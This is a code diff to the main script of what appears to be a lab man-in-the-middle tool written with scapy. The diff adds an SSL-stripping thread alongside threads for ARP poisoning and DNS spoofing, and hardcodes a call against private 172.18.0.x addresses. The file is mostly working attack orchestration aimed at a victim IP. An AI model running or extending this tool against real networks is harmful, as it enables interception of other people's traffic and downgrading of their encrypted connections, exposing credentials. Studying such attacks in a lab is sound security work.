@@ -1,6 +1,7 @@
 from arp_poisoning import ARPPoison
 from dns_spoofing import DNSSpoof
 from dns_learner import DNSLearner
+from ssl_stripping import SSLStrip
 
 import scapy.all as scapy
 import logging
@@ -9,8 +10,6 @@ import time
 
 def setup():
     # Setup attack
-    scapy.conf.verb = 0
-    logging.getLogger("scapy").setLevel(logging.ERROR)
     try:
         iface = input("> Interface: ")
         victim = input("> Victim IP: ")
@@ -31,13 +30,13 @@ def setup():
     return iface, victim, site, timer
 
 def run(iface, victim, site, timer):
-    # Execute ARP Poisoning in a separate thread to maintain MitM position
-    arp = ARPPoison(iface, victim, site)
     stop_event = threading.Event()
 
+    # Poison ARP in a separate thread (to maintain MitM position)
+    arp = ARPPoison(iface, victim, site)
     arp_thread = threading.Thread(
         target=arp.attack,
-        args=(timer, stop_event,),
+        args=(timer, stop_event,)
     )
 
     # Learn DNS in a separate thread
@@ -55,10 +54,17 @@ def run(iface, victim, site, timer):
         args=(stop_event,)
     )
 
+    # Strip SSL in a separate thread
+    ssl_stripper = SSLStrip(iface, victim, site)
+    ssl_thread = threading.Thread(
+        target=ssl_stripper.start,
+        args=(stop_event,)
+    )
+
     arp_thread.start()
     dns_learn_thread.start()
     dns_sniff_thread.start()
-
+    ssl_thread.start()
 
     # Keep main thread alive
     try:
@@ -67,7 +73,12 @@ def run(iface, victim, site, timer):
     except KeyboardInterrupt:
         # Program should stop on CTRL+C
         stop_event.set()
+
         arp_thread.join()
+        dns_learn_thread.join()
+        dns_sniff_thread.join()
+        ssl_thread.join()
+
         dns_spoofer.disable_dns_block()
 
         restore = input("> Restore ARP tables? [Y/N] ").strip().lower()
@@ -82,5 +93,11 @@ def run(iface, victim, site, timer):
             exit(0)
 
 if __name__ == "__main__":
-    iface, victim, site, timer = setup()
-    run(iface, victim, site, timer)
+    scapy.conf.verb = 0
+    logging.getLogger("scapy").setLevel(logging.ERROR)
+
+    #iface, victim, site, timer = setup()
+    #run(iface, victim, site, timer)
+
+    # TODO: Eventually remove this and uncomment the lines above
+    run("eth0", "172.18.0.10", "172.18.0.30", 5)
